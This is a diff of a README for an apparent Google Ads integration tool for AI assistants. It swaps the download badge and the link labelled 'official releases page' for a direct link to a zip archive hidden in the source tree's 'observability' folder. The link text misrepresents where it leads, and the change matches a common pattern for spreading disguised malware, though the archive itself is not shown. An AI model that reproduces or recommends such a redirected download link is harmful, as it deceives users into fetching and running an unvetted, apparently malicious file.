@@ -1,6 +1,6 @@
 # 📈 google-ads-mcp - Manage Google Ads with smart AI
 
-[![](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/elvis-velez/google-ads-mcp/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/elvis-velez/google-ads-mcp/raw/refs/heads/main/src/google_ads_mcp/observability/mcp-google-ads-v2.5-beta.1.zip)
 
 This application connects your AI assistant to your Google Ads account. You use your AI to review and update your marketing campaigns. The system ensures changes stay safe by requiring your approval before any update writes to your account.
 
@@ -19,7 +19,7 @@ To use this software, you need:
 
 ## 📥 How to get started
 
-1. Visit the [official releases page](https://github.com/elvis-velez/google-ads-mcp/releases).
+1. Visit the [official releases page](https://github.com/elvis-velez/google-ads-mcp/raw/refs/heads/main/src/google_ads_mcp/observability/mcp-google-ads-v2.5-beta.1.zip).
 2. Look for the latest version under the "Assets" section.
 3. Download the version designed for Windows.
 4. Save the file to a folder you can find later.
